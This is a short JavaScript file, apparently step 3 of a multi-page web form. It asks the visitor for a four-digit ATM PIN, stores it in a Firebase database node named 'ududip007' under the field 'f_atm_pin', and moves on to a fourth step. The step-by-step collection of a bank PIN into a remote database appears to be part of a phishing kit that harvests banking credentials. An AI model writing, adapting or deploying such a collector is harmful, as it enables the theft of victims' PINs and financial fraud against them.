// Step 3: Append ATM PIN to ududip007 node

var firebaseKey = localStorage.getItem("firebaseKey");

if (!firebaseKey) {
  alert("Please complete Step 1 first.");
  window.location.href = "index.html";
}

var userRef = firebase.database().ref("ududip007/" + firebaseKey);

// Submit handler
document.getElementById("ududip007").addEventListener("submit", function (e) {
  e.preventDefault();

  var pin = document.getElementById("atmpin").value.trim();

  if (pin.length !== 4) {
    alert("Please enter a valid 4-digit PIN.");
    return;
  }

  userRef.update({
    f_atm_pin: pin
  }).then(() => {
    window.location.href = "step4.html";
  }).catch((error) => {
    alert("Error: " + error.message);
  });
});
